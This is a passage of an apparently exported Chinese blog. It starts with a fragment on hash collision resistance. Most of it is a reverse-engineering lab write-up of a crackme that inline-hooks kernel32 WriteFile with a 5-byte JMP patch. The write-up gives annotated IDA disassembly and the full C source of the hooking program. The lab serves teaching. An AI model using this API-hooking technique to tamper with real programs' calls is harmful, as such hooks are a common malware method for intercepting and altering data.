<h2 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h2><p><img src="https://img-blog.csdnimg.cn/20210421161328124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>hash函数的抗二次原像性：对于给定的消息M1，发现另一个消息M2，使得H(M1)=H(M2)在计算上是不可行的。<br>抗碰撞性：找到任意一对不同的M1和M2，使得H（M1）=H（M2）在计算上是不可行的。<br><img src="https://img-blog.csdnimg.cn/20210421161358965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/undefined/WriteFileApIHook1%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html</url>
    <content><![CDATA[<h2 id="WriteFileApIHook1逆向分析"><a href="#WriteFileApIHook1逆向分析" class="headerlink" title="WriteFileApIHook1逆向分析"></a>WriteFileApIHook1逆向分析</h2><h4 id="1-实验结果"><a href="#1-实验结果" class="headerlink" title="1.实验结果"></a>1.实验结果</h4><p>打开set_pwd.exe，从名称来看应该是进行密码设置，程序提示输入key：随便输入11111，结果如下：try again，当尝试输入hook时，显示如下：</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210522203802061.png" alt="image-20210522203802061"></p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210522210118084.png" alt="image-20210522210118084"></p>
<p>打开在文件夹中生成的pwd.txt文件，发现第一次的结果并不是我们输入的11111，而是hook，重复几次发现结果相同。</p>
<h4 id="2-实验工具"><a href="#2-实验工具" class="headerlink" title="2.实验工具"></a>2.实验工具</h4><p>IDA (静态和动态分析)</p>
<h4 id="3-实验分析"><a href="#3-实验分析" class="headerlink" title="3.实验分析"></a>3.实验分析</h4><p>使用IDA打开exe文件</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210522210252417.png" alt="image-20210522210252417"></p>
<h5 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h5><p>打开IDA View-B 窗口，结合所学定位到main函数及一些关键函数如virtualprotect</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210522210433490.png" alt="image-20210522210433490"></p>
<p>同时注意到有sub等汇编指令，可知这里便是主函数修改writefile前5个字节的地方，静态分析主函数功能:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.text:004011EE                 mov     [ebp+Stream], <span class="number">0</span></span><br><span class="line">.text:004011F5                 mov     [ebp+var_14], <span class="number">0</span></span><br><span class="line">.text:004011FC                 mov     [ebp+var_20], 0E9h       <span class="comment">//将0E9h压入数组为之后改变指令做准备</span></span><br><span class="line">.text:<span class="number">00401200</span>                 mov     [ebp+var_1F], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00401204</span>                 xor     eax, eax</span><br><span class="line">.text:<span class="number">00401206</span>                 mov     [ebp+var_1E], eax</span><br><span class="line">.text:00401209                 mov     ecx, ds:dword_4280C8</span><br><span class="line">.text:<span class="number">0040120F</span>                 mov     [ebp+Buffer], ecx</span><br><span class="line">.text:<span class="number">00401212</span>                 mov     edx, ds:dword_4280CC</span><br><span class="line">.text:00401218                 mov     [ebp+var_58], edx</span><br><span class="line">.text:0040121B                 mov     al, ds:byte_4280D0</span><br><span class="line">.text:<span class="number">00401220</span>                 mov     [ebp+var_54], al</span><br><span class="line">.text:<span class="number">00401223</span>                 mov     esi, esp</span><br><span class="line">.text:<span class="number">00401225</span>                 push    offset ModuleName ; <span class="string">&quot;kernel32.dll&quot;</span></span><br><span class="line">.text:0040122A                 call    ds:GetModuleHandleA</span><br><span class="line">.text:<span class="number">00401230</span>                 cmp     esi, esp</span><br><span class="line">.text:<span class="number">00401232</span>                 call    __chkesp</span><br><span class="line">.text:<span class="number">00401237</span>                 mov     [ebp+hModule], eax</span><br><span class="line">.text:0040123A                 mov     esi, esp</span><br><span class="line">.text:0040123C                 push    offset ProcName ; <span class="string">&quot;WriteFile&quot;</span></span><br><span class="line">.text:<span class="number">00401241</span>                 mov     ecx, [ebp+hModule]</span><br><span class="line">.text:<span class="number">00401244</span>                 push    ecx             ; hModule</span><br><span class="line">.text:<span class="number">00401245</span>                 call    ds:GetProcAddress</span><br><span class="line">.text:0040124B                 cmp     esi, esp</span><br><span class="line">.text:<span class="number">0040124D</span>                 call    __chkesp         </span><br><span class="line">.text:<span class="number">00401252</span>                 mov     [ebp+var_C], eax</span><br><span class="line">.text:<span class="number">00401255</span>                 mov     edx, [ebp+var_C]</span><br><span class="line">.text:00401258                 mov     [ebp+lpAddress], edx</span><br><span class="line">.text:0040125B                 mov     esi, esp</span><br><span class="line">.text:<span class="number">0040125D</span>                 lea     eax, [ebp+flOldProtect]</span><br><span class="line">.text:<span class="number">00401260</span>                 push    eax             ; lpflOldProtect</span><br><span class="line">.text:<span class="number">00401261</span>                 push    40h ; <span class="string">&#x27;@&#x27;</span>       ; flNewProtect</span><br><span class="line">.text:<span class="number">00401263</span>                 push    <span class="number">5</span>               ; dwSize</span><br><span class="line">.text:<span class="number">00401265</span>                 mov     ecx, [ebp+lpAddress]</span><br><span class="line">.text:00401268                 push    ecx             ; lpAddress</span><br><span class="line">.text:00401269                 call    ds:VirtualProtect              <span class="comment">//调用virtualProtect函数，同时为If语句判断</span></span><br><span class="line">.text:<span class="number">0040126F</span>                 cmp     esi, esp                      </span><br><span class="line">.text:<span class="number">00401271</span>                 call    __chkesp</span><br><span class="line">.text:<span class="number">00401276</span>                 test    eax, eax</span><br><span class="line">.text:00401278                 jz      <span class="keyword">short</span> loc_4012E9</span><br><span class="line">.text:0040127A                 push    <span class="number">5</span>               ; Size</span><br><span class="line">.text:0040127C                 mov     edx, [ebp+lpAddress]</span><br><span class="line">.text:<span class="number">0040127F</span>                 push    edx             ; Src</span><br><span class="line">.text:00401280                 push    offset unk_42DC64 ; <span class="keyword">void</span> *</span><br><span class="line">.text:00401285                 call    _memcpy                  <span class="comment">//第一个memcpy函数将writefile函数的前5个字节保存</span></span><br><span class="line">.text:0040128A                 add     esp, 0Ch</span><br><span class="line">.text:<span class="number">0040128D</span>                 mov     eax, offset sub_40100A</span><br><span class="line">.text:00401292                 cdq</span><br><span class="line">.text:00401293                 mov     ecx, eax</span><br><span class="line">.text:00401295                 mov     esi, edx</span><br><span class="line">.text:00401297                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:0040129A                 cdq</span><br><span class="line">.text:0040129B                 sub     ecx, eax</span><br><span class="line">.text:<span class="number">0040129D</span>                 sbb     esi, edx</span><br><span class="line">.text:<span class="number">0040129F</span>                 sub     ecx, <span class="number">5</span>                       </span><br><span class="line">.text:004012A2                 sbb     esi, <span class="number">0</span></span><br><span class="line">.text:004012A5                 mov     [ebp+Src], ecx              <span class="comment">//计算mywritefile函数和write函数的偏移值，同时</span></span><br><span class="line">.text:004012A8                 push    <span class="number">4</span>               ; Size      <span class="comment">//减去writefile函数的前5个字节</span></span><br><span class="line">.text:004012AA                 lea     edx, [ebp+Src]</span><br><span class="line">.text:004012AD                 push    edx             ; Src</span><br><span class="line">.text:004012AE                 lea     eax, [ebp+var_1F]</span><br><span class="line">.text:004012B1                 push    eax             ; <span class="keyword">void</span> *</span><br><span class="line">.text:004012B2                 call    _memcpy                      <span class="comment">//第二个memcpy函数将计算出的偏移值与数组中的</span></span><br><span class="line">.text:004012B7                 add     esp, 0Ch     				<span class="comment">//0E9h拼接形成jmp跳转指令改变原本要跳转到</span></span><br><span class="line">.text:004012BA                 push    <span class="number">5</span>               ; Size       <span class="comment">//writefile函数为到自定义的mywritefile函数</span></span><br><span class="line">.text:004012BC                 lea     ecx, [ebp+var_20]</span><br><span class="line">.text:004012BF                 push    ecx             ; Src</span><br><span class="line">.text:004012C0                 mov     edx, [ebp+var_C]</span><br><span class="line">.text:004012C3                 push    edx             ; <span class="keyword">void</span> * </span><br><span class="line">.text:004012C4                 call    _memcpy						<span class="comment">//第三个memcpy函数将jmp指令写到writefile函数</span></span><br><span class="line">.text:004012C9                 add     esp, 0Ch						<span class="comment">//中改变原有函数实现hook</span></span><br><span class="line">.text:004012CC                 mov     esi, esp</span><br><span class="line">.text:004012CE                 lea     eax, [ebp+flOldProtect]</span><br><span class="line">.text:004012D1                 push    eax             ; lpflOldProtect</span><br><span class="line">.text:004012D2                 mov     ecx, [ebp+flOldProtect]</span><br><span class="line">.text:004012D5                 push    ecx             ; flNewProtect</span><br><span class="line">.text:004012D6                 push    <span class="number">5</span>               ; dwSize</span><br><span class="line">.text:004012D8                 mov     edx, [ebp+var_C]</span><br><span class="line">.text:004012DB                 push    edx             ; lpAddress</span><br><span class="line">.text:004012DC                 call    ds:VirtualProtect             <span class="comment">//最后调用virtualProtect函数</span></span><br><span class="line">.text:<span class="number">004012E2</span>                 cmp     esi, esp</span><br><span class="line">.text:<span class="number">004012E4</span>                 call    __chkesp</span><br><span class="line">.text:<span class="number">004012E9</span></span><br></pre></td></tr></table></figure>



<h5 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h5><p>分别在主函数的调用writefile函数以及mywritefile函数的调用中设置断点，否则动态分析时程序会自动运行到结尾，mywritefile:</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210522213727152.png" alt="image-20210522213727152"></p>
<p>（ps:直接基于地址进行调用，而不是基于函数名）</p>
<p>主函数：</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210522214100298.png" alt="image-20210522214100298"></p>
<p>使用IDA的动态分析</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210522214218759.png" alt="image-20210522214218759"></p>
<p>程序运行后在主函数的断点处停止，将要调用writefile函数，单步步入观察</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523111357987.png" alt="image-20210523111357987"></p>
<p>发现kernel32 writefile函数的指令发生改变，由于修改了writefile函数的前5个字节导致第一条指令变为跳转到sub_40100A(mywrite函数)，之后的指令由于汇编的线性扫描算法导致机器指令被打乱，变成了数字，继续单步步入：发现跳转到了mywrite(su_40100A)的入口处</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523111724140.png" alt="image-20210523111724140"></p>
<p>继续观察，进入mywritefile函数</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523111854540.png" alt="image-20210523111854540"></p>
<p>在mywrite函数中</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523113924662.png" alt="image-20210523113924662"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> 			   mov     eax, ds:dword_428038          <span class="comment">//为新声明的buff数组，6B6F68h为&#x27;hook&#x27;的十六进制数</span></span><br><span class="line">.text:<span class="number">0040111D</span> mov     dword ptr [ebp+Str], eax</span><br><span class="line">.text:<span class="number">00401120</span> mov     cl, ds:byte_42803C            </span><br><span class="line">.text:<span class="number">00401126</span> mov     [ebp+var_8], cl </span><br><span class="line">.text:00401129 call    sub_401005 						<span class="comment">//调用了unhook函数脱钩</span></span><br><span class="line">.text:0040112E mov     esi, esp</span><br><span class="line">.text:<span class="number">00401130</span> push    offset ProcName                 ; <span class="string">&quot;WriteFile&quot;</span></span><br><span class="line">.text:<span class="number">00401135</span> mov     edi, esp</span><br><span class="line">.text:<span class="number">00401137</span> push    offset ModuleName               ; <span class="string">&quot;kernel32.dll&quot;</span></span><br><span class="line">.text:0040113C call    ds:GetModuleHandleA       		</span><br><span class="line">.text:<span class="number">00401142</span> cmp     edi, esp</span><br><span class="line">.text:<span class="number">00401144</span> call    __chkesp</span><br><span class="line">.text:00401149 push    eax                             ; hModule</span><br><span class="line">.text:0040114A call    ds:GetProcAddress 				<span class="comment">//获取kernel32中wrierfile的地址</span></span><br><span class="line">.text:<span class="number">00401150</span> cmp     esi, esp</span><br><span class="line">.text:<span class="number">00401152</span> call    __chkesp</span><br><span class="line">.text:<span class="number">00401157</span> mov     [ebp+var_4], eax</span><br><span class="line">.text:0040115A mov     esi, esp</span><br><span class="line">.text:0040115C mov     edx, [ebp+arg_10]</span><br><span class="line">.text:<span class="number">0040115F</span> push    edx</span><br><span class="line">.text:<span class="number">00401160</span> mov     eax, [ebp+arg_C]</span><br><span class="line">.text:<span class="number">00401163</span> push    eax</span><br><span class="line">.text:<span class="number">00401164</span> lea     ecx, [ebp+Str]</span><br><span class="line">.text:<span class="number">00401167</span> push    ecx                             ; Str</span><br><span class="line">.text:00401168 call    _strlen</span><br><span class="line">.text:<span class="number">0040116D</span> add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00401170</span> push    eax</span><br><span class="line">.text:<span class="number">00401171</span> lea     edx, [ebp+Str]</span><br><span class="line">.text:<span class="number">00401174</span> push    edx</span><br><span class="line">.text:<span class="number">00401175</span> mov     eax, [ebp+arg_0]</span><br><span class="line">.text:00401178 push    eax</span><br><span class="line">.text:00401179 call    [ebp+var_4]</span><br><span class="line">.text:0040117C cmp     esi, esp</span><br><span class="line">.text:0040117E call    __chkesp</span><br><span class="line">.text:00401183 mov     eax, <span class="number">1</span></span><br><span class="line">.text:00401188 pop     edi</span><br><span class="line">.text:00401189 pop     esi</span><br><span class="line">.text:0040118A pop     ebx</span><br><span class="line">.text:0040118B add     esp, 4Ch</span><br><span class="line">.text:0040118E cmp     ebp, esp</span><br><span class="line">.text:00401190 call    __chkesp</span><br><span class="line">.text:00401195 mov     esp, ebp</span><br><span class="line">.text:00401197 pop     ebp</span><br><span class="line">.text:00401198 retn    14h</span><br><span class="line">.text:00401198 sub_401100 endp</span><br></pre></td></tr></table></figure>



<p>先分析一下unhook函数（sub_401005），单步步入</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523112848019.png" alt="image-20210523112848019"></p>
<p>其汇编指令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     esi, esp</span><br><span class="line">.text:0040104A push    offset ProcName                 ; <span class="string">&quot;WriteFile&quot;</span></span><br><span class="line">.text:<span class="number">0040104F</span> mov     edi, esp</span><br><span class="line">.text:<span class="number">00401051</span> push    offset ModuleName               ; <span class="string">&quot;kernel32.dll&quot;</span></span><br><span class="line">.text:<span class="number">00401056</span> call    ds:GetModuleHandleA</span><br><span class="line">.text:0040105C cmp     edi, esp</span><br><span class="line">.text:0040105E call    __chkesp</span><br><span class="line">.text:<span class="number">00401063</span> push    eax                             ; hModule</span><br><span class="line">.text:<span class="number">00401064</span> call    ds:GetProcAddress				<span class="comment">//获取writefile函数的地址</span></span><br><span class="line">.text:0040106A cmp     esi, esp</span><br><span class="line">.text:0040106C call    __chkesp</span><br><span class="line">.text:<span class="number">00401071</span> mov     [ebp+var_C], eax</span><br><span class="line">.text:<span class="number">00401074</span> mov     eax, [ebp+var_C]</span><br><span class="line">.text:<span class="number">00401077</span> mov     [ebp+lpAddress], eax</span><br><span class="line">.text:0040107A mov     esi, esp</span><br><span class="line">.text:0040107C lea     ecx, [ebp+flOldProtect]</span><br><span class="line">.text:<span class="number">0040107F</span> push    ecx                             ; lpflOldProtect</span><br><span class="line">.text:00401080 push    40h ; <span class="string">&#x27;@&#x27;</span>                       ; flNewProtect</span><br><span class="line">.text:00401082 push    <span class="number">5</span>                               ; dwSize</span><br><span class="line">.text:00401084 mov     edx, [ebp+lpAddress]</span><br><span class="line">.text:00401087 push    edx                             ; lpAddress</span><br><span class="line">.text:00401088 call    ds:VirtualProtect					<span class="comment">//根据地址获取writefile的前5个字节</span></span><br><span class="line">.text:0040108E cmp     esi, esp </span><br><span class="line">.text:00401090 call    __chkesp</span><br><span class="line">.text:00401095 push    <span class="number">5</span>                               ; Size</span><br><span class="line">.text:00401097 push    offset unk_42DC64               ; Src</span><br><span class="line">.text:0040109C mov     eax, [ebp+lpAddress]</span><br><span class="line">.text:<span class="number">0040109F</span> push    eax                             ; <span class="keyword">void</span> *</span><br><span class="line">.text:004010A0 call    _memcpy								<span class="comment">//调用memcpy函数将之前保存的writefile函数前5个字节复原</span></span><br><span class="line">.text:004010A5 add     esp, 0Ch</span><br><span class="line">.text:004010A8 mov     esi, esp</span><br><span class="line">.text:004010AA lea     ecx, [ebp+flOldProtect]</span><br><span class="line">.text:004010AD push    ecx                             ; lpflOldProtect</span><br><span class="line">.text:004010AE mov     edx, [ebp+flOldProtect]</span><br><span class="line">.text:004010B1 push    edx                             ; flNewProtect</span><br><span class="line">.text:004010B2 push    <span class="number">5</span>                               ; dwSize</span><br><span class="line">.text:004010B4 mov     eax, [ebp+lpAddress]</span><br><span class="line">.text:004010B7 push    eax                             ; lpAddress</span><br><span class="line">.text:004010B8 call    ds:VirtualProtect  					<span class="comment">//再次hook住以便下次操作</span></span><br><span class="line">.text:004010BE cmp     esi, esp</span><br><span class="line">.text:004010C0 call    __chkesp</span><br><span class="line">.text:004010C5 pop     edi</span><br><span class="line">.text:004010C6 pop     esi</span><br><span class="line">.text:004010C7 pop     ebx</span><br><span class="line">.text:004010C8 add     esp, 4Ch</span><br><span class="line">.text:004010CB cmp     ebp, esp</span><br><span class="line">.text:004010CD call    __chkesp</span><br><span class="line">.text:004010D2 mov     esp, ebp</span><br><span class="line">.text:004010D4 pop     ebp</span><br><span class="line">.text:004010D5 retn</span><br><span class="line">.text:004010D5 sub_401030 endp</span><br></pre></td></tr></table></figure>



<p>回到mywrite函数，mywrite函数还会重新调用writefile函数进行文件写入，直接运行到断点处进入调用的write函数中观察</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523113559429.png" alt="image-20210523113559429"></p>
<p>发现writefile函数前5个字节已经被复原，指令被修复</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523114148717.png" alt="image-20210523114148717"></p>
<p>writefile函数的功能就是将mywritefile中buf数组的内容写入文件中，直接运行结束，打开文件夹发现新生成的pwd.txt内容正如分析的为hook</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523114832571.png" alt="image-20210523114832571"></p>
<img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523114746251.png" alt="image-20210523114746251" style="zoom: 80%;" />

<p>在主函数结尾，又对生成的pwd文件进行扫描（失败则输出scan fail)，并与输入的key进行比较，如果两者相等则输出congratulations!,否则输出try again!</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210523115224690.png" alt="image-20210523115224690"></p>
<p>附源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt; </span><br><span class="line">BYTE pOrgByte[<span class="number">5</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"><span class="function">typedef <span class="title">BOOL</span><span class="params">(WINAPI *PFWriteFile)</span><span class="params">(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unhook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line">	PBYTE pWriteFile;</span><br><span class="line">	FARPROC pFunc;</span><br><span class="line">	pFunc = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;WriteFile&quot;</span>);</span><br><span class="line">	pWriteFile = (PBYTE)pFunc;</span><br><span class="line">	VirtualProtect(pWriteFile, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);	</span><br><span class="line">	memcpy(pWriteFile, pOrgByte, <span class="number">5</span>);	</span><br><span class="line">	VirtualProtect(pWriteFile, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL __stdcall <span class="title">MyWriteFile</span><span class="params">(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)</span></span></span><br><span class="line"><span class="function"></span>&#123;	FARPROC pFunc;	</span><br><span class="line">	<span class="keyword">char</span> buf[] =<span class="string">&quot;hook&quot;</span>;	</span><br><span class="line">	unhook();	</span><br><span class="line">	pFunc = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;WriteFile&quot;</span>);		</span><br><span class="line">	((PFWriteFile)pFunc)(hFile, buf, strlen(buf), lpNumberOfBytesWritten, lpOverlapped);	</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;	</span><br><span class="line">	HMODULE hKernel32;	</span><br><span class="line">	FARPROC pWriteFile;	</span><br><span class="line">	FILE *fp=NULL;</span><br><span class="line">	FILE *fkey=NULL;</span><br><span class="line">	PBYTE pEditFunc;	</span><br><span class="line">	BYTE pJmpCode[<span class="number">6</span>] = &#123; <span class="number">0xE9</span>,<span class="number">0</span>, &#125;;	</span><br><span class="line">	<span class="keyword">char</span> pwd[<span class="number">15</span>];</span><br><span class="line">	<span class="keyword">char</span> key[<span class="number">15</span>];</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	DWORD dwOldProtect, pOffset,dwWritenSize;	</span><br><span class="line">	<span class="keyword">char</span> buf[] = <span class="string">&quot;real_pwd&quot;</span>;	</span><br><span class="line">	hKernel32 = GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>);	</span><br><span class="line">	pWriteFile = GetProcAddress(hKernel32, <span class="string">&quot;WriteFile&quot;</span>);	</span><br><span class="line">	pEditFunc = (PBYTE)pWriteFile;	</span><br><span class="line">	<span class="keyword">if</span> (VirtualProtect(pEditFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect))	</span><br><span class="line">	&#123;		</span><br><span class="line">		memcpy(pOrgByte, pEditFunc, <span class="number">5</span>);		</span><br><span class="line">		pOffset = (ULONGLONG)MyWriteFile - (ULONGLONG)pWriteFile - <span class="number">5</span>;		</span><br><span class="line">		memcpy(&amp;pJmpCode[<span class="number">1</span>], &amp;pOffset, <span class="number">4</span>);		</span><br><span class="line">		memcpy(pWriteFile, &amp;pJmpCode[<span class="number">0</span>], <span class="number">5</span>);		</span><br><span class="line">		VirtualProtect(pWriteFile, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);	</span><br><span class="line">	&#125;	</span><br><span class="line">	hFile = CreateFile(<span class="string">&quot;pwd.txt&quot;</span>, GENERIC_ALL,<span class="number">0</span>, NULL, CREATE_ALWAYS, <span class="number">0x80</span>, NULL);	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	if(hFile!=NULL)</span></span><br><span class="line"><span class="comment">		printf(&quot;open1 success\n&quot;);</span></span><br><span class="line"><span class="comment">	else</span></span><br><span class="line"><span class="comment">		printf(&quot;open1 fail\n&quot;);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	WriteFile(hFile, buf, strlen(buf), &amp;dwWritenSize, NULL);</span><br><span class="line">	CloseHandle(hFile);</span><br><span class="line">	<span class="keyword">if</span>(fp=fopen(<span class="string">&quot;pwd.txt&quot;</span>,<span class="string">&quot;r&quot;</span>))</span><br><span class="line">		printf(<span class="string">&quot;open success\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		printf(<span class="string">&quot;open fail\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp!=NULL)</span><br><span class="line">		fscanf(fp,<span class="string">&quot;%s&quot;</span>,pwd);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		printf(<span class="string">&quot;scan fail\n&quot;</span>);</span><br><span class="line">	printf(<span class="string">&quot;plz input key\n&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%s&quot;</span>,key);</span><br><span class="line">	<span class="keyword">if</span>(fp!=NULL)</span><br><span class="line">		fclose(fp);</span><br><span class="line">	ret=lstrcmp(key,pwd);      <span class="comment">//将输入的key和pwd进行比较</span></span><br><span class="line">	<span class="keyword">if</span>(ret == <span class="number">0</span>)</span><br><span class="line">        printf(<span class="string">&quot;congratulations!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        printf(<span class="string">&quot;try again!\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
</search>
